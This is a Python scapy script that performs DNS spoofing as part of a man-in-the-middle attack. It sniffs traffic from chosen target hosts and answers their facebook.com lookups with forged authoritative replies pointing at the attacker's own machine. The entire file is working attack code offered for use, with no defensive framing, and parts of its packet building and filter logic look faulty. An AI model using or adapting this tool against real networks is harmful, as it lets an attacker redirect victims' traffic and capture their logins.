from scapy.all import *
import logging

logger = logging.getLogger("SPOFFER")

ifname = None
targets_MAC = None
gateway_MAC = None
ifname = None
targets = None
target_MAC_mapper = {}
my_addr = None

def make_reply(pkt,redirect):
    fake_pkt = IP(dst=pkt[IP].src,
                    src=pkt[IP].dst)/\
                    UDP(dport=pkt[UDP].sport,sport=53)/\
                    DNS(id=pkt[DNS].id,
                        #qd=pkt[DNS].qd,
                        aa=1,
                        qr=1,
                        ancount=1,
                        an=DNSRR(rrname=pkt[DNSQR].qname, rdata=redirect))/\
                    DNSRR(
                        rrname=pkt[DNSQR].qname,
                        rdata=redirect)
    fake_pkt.show()
    return fake_pkt     

def handle_packet(pkt):

    if pkt.haslayer(DNSQR) and pkt.haslayer(IP) and pkt[DNS].opcode == 0 and pkt[IP].src in targets and pkt[0].dst == my_addr:
        qname = pkt[DNSQR].qname.decode('utf-8')
        print(qname)
        if qname == "www.facebook.com." or qname == "www.facebook.com" or qname == "facebook.com." or qname == "facebook.com":
            send(make_reply(pkt, get_if_addr(ifname)))



def StartMITM(_targets, _targets_MAC, _gateway_MAC, _ifname):
    global targets, targets_MAC, ifname, target_MAC_mapper, my_addr

    targets = _targets
    targets_MAC = _targets_MAC
    ifname = _ifname
    gateway_MAC = _gateway_MAC

    for i, target in enumerate(targets):
        target_MAC_mapper[target] = targets_MAC[i]
    my_addr = get_if_hwaddr(ifname)

    filter_ = ""
    if targets:
        for t in targets:
            if len(filter_) > 0:
                filter_ += " and host " + t
            else:
                filter_ += "host " + t
    sniff(filter=filter_, prn=handle_packet, iface=ifname)
    logger.info("EXIT")
